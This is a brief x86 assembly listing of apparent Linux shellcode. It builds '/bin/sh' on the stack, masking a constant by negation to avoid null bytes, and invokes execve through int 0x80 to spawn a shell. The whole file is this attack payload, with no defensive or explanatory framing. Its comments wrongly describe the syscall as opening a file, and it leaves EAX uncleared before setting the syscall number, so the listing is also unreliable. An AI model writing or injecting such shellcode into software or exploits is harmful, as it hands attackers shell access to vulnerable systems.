[SECTION .text]

global _start
_start:
        jmp stack_fix
        nop
open:
;open the file
        mov ebx, 0xff978cd1
        neg ebx
        push ebx
        mov ebx, 0x6e69622f
        push ebx

        push esp
        pop ebx ;bin sh

        xor edx,edx ;no envs
        push esp
        pop ebx
        
        
        push edx
        push ebx
        push esp
        pop ecx
        
        
        mov al, 11 ;int 0x80 to open file
        int 0x80


stack_fix:
        call open
        ret

